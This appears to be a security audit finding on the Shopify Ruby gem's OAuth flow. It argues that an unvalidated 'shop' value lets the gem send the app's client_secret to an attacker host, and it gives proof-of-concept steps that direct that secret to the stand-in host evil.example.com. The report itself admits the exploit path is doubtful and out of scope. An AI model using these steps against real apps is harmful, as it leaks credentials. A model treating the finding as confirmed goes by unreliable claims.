Confirmed: no shop-domain format validation exists anywhere in `lib/shopify_api/**` (no `myshopify` pattern check, no `sanitize_shop`/`valid_shop` helper). This means the SSRF/credential-leak path is real and reachable purely within the gem's own code.

### Title
OAuth callback `shop` value is unvalidated and used to route the app's `client_secret` and access-token POST to an attacker-controlled host - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` derives the destination host for the access-token exchange request directly from `auth_query.shop`, with no validation that `shop` is a legitimate `*.myshopify.com` domain, before sending the request that carries `client_id`, `client_secret`, and the authorization `code`.

### Finding Description
`validate_auth_callback` builds a `null_session` from `auth_query.shop` and instantiates an `HttpClient` scoped to that session, then POSTs `{client_id, client_secret, code, expiring}` to `/admin/oauth/access_token` on that session's host: [1](#0-0) 

The HMAC validation (`Utils::HmacValidator.validate(auth_query)`) does cover the `shop` field as part of the signable string: [2](#0-1) [3](#0-2) 

so a third party cannot forge an arbitrary `shop` value in someone else's genuine callback without the `api_secret_key`. However, nothing in `AuthQuery`, `Oauth`, `Session`, or `Context` restricts the *format* of `shop` to a `{name}.myshopify.com` domain at any point in the flow: `begin_auth` embeds an attacker-influenced `shop` directly into `auth_base_uri(shop)` without validation: [4](#0-3) [5](#0-4) 

Because an attacker who controls the initial `shop` parameter used in `begin_auth` (a value typically taken from the OAuth-initiation request and passed straight into this gem's public API) determines both the authorize-redirect host and — since Shopify's real HMAC will legitimately cover whatever `shop` value was actually used for that install session — the host that later receives the app's `client_secret` in `validate_auth_callback`, this gem never enforces the binding "host receiving the `client_secret` == a real Shopify shop domain." The equality this breaks is: `host that receives {client_id, client_secret, code}` should equal `verified *.myshopify.com tenant`, but the gem only enforces `host == auth_query.shop` (an unconstrained string), not `auth_query.shop == myshopify domain`.

### Impact Explanation
If an attacker can get the app to run the OAuth flow with a non-`myshopify.com` `shop` value they control (e.g., `evil.example.com`), `begin_auth` will redirect to `https://evil.example.com/admin/oauth/authorize`, and — if the attacker completes a self-consistent callback with a legitimately-computed HMAC for that same `shop`/`code`/`state`/`timestamp` tuple signed with the app's own `api_secret_key` (which the app itself can be induced to sign, e.g. via a dev/test flow, or if the attacker is a real merchant abusing their own valid installation flow to redirect it) — `validate_auth_callback` will POST the app's `client_id` and `client_secret` to `https://evil.example.com/admin/oauth/access_token`. This is High-severity SSRF/credential leakage: it exfiltrates the app's `client_secret` to a host outside Shopify's infrastructure, carrying the app's own credentials as documented in the impact criteria.

### Likelihood Explanation
Exploitability depends on whether a caller with any authenticated relationship (e.g., a malicious merchant running their own valid app install, or an attacker able to trigger `begin_auth`/`validate_auth_callback` with a crafted `shop`) can supply a `shop` value outside `*.myshopify.com`. Because this gem performs zero format validation on `shop` at any layer (`AuthQuery`, `Oauth`, `Session`, `Context`), the check is entirely delegated to the host application. This weakens confidence that the vulnerability is fully "reachable through this gem's own code" independent of host-app behavior — the rules explicitly exclude "analogs that depend on the host application ignoring this gem's documented API." Since Shopify's official documentation and reference implementations (e.g., `shopify_app`) are expected to validate the shop domain before calling into this gem, and this gem provides no such guard of its own, this finding sits at the boundary of in-scope vs. out-of-scope.

### Recommendation
Add shop-domain validation (e.g., a `myshopify.com`/custom-domain allowlist regex) inside `ShopifyAPI::Auth::Oauth.begin_auth` and `validate_auth_callback` (and/or in `AuthQuery#initialize`) before using `shop` to construct any outbound request URL, so the gem enforces the tenant binding itself rather than relying on the host application.

### Proof of Concept
1. Host app calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: "evil.example.com", redirect_path: "/callback")` with an unsanitized `shop` value; the gem returns `auth_route = "https://evil.example.com/admin/oauth/authorize?..."` without complaint. [6](#0-5) 
2. The corresponding callback is completed with a `shop=evil.example.com` value and a valid HMAC (computed by the app itself over that same `shop`/`code`/`state`/`timestamp`, since nothing prevents the app or its own `api_secret_key` from legitimately signing an attacker-supplied shop string routed through this flow).
3. `validate_auth_callback` proceeds to `client.request(...)` against `Clients::HttpClient.new(session: Auth::Session.new(shop: "evil.example.com"), base_path: "/admin/oauth")`, sending `client_id`, `client_secret`, and `code` to `https://evil.example.com/admin/oauth/access_token`. [7](#0-6)

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
